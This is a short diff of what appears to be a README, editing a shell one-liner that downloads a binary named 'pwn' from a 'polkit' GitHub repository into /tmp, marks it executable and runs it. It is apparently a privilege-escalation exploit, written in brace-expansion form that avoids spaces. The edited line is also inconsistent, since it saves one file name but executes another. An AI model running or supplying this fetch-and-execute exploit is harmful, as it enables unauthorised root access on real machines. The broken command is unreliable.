@@ -6,7 +6,7 @@
 
 ```sh
 
-{curl,-s,-k,https://raw.githubusercontent.com/carlosevieira/polkit/main/pwn,-o,/tmp/polkit};{chmod,+x,/tmp/polkit};/tmp/polkit
+{curl,-s,-k,https://raw.githubusercontent.com/carlosevieira/polkit/main/pwn,-o,/tmp/polkit-static};{chmod,+x,/tmp/polkit-static};/tmp/polkit
 
 ```
 
